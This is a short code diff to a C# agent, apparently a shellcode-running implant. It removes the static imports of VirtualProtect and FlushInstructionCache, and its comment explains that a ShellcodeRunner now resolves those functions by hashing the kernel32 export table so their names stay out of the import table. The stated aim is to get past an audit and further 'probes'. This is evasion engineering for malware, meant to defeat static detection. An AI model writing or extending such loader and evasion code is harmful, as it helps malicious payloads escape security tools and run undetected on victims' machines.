@@ -49,14 +49,13 @@ namespace CSharpAgent
 
     internal static class NativeImports
     {
-        [DllImport("kernel32.dll", EntryPoint = "VirtualProtect", SetLastError = true)]
-        internal static extern bool ChangeMemoryProtection(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        // NOTE (audit No.21, rung 1): VirtualProtect and FlushInstructionCache are GONE from
+        // this static surface — ShellcodeRunner resolves both at call time from the live
+        // kernel32 export table by hash, so neither name rides the import table. The four
+        // declarations below are the remaining imports (Identity's probes — later rungs).
 
         [DllImport("kernel32.dll")]
         internal static extern void GetNativeSystemInfo(out SYSTEM_INFO lpSystemInfo);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        internal static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
 
         // Truthful OS version (Environment.OSVersion inherits the host manifest's compatibility
         // lies on Windows 8.1+). Returns 0 on success.
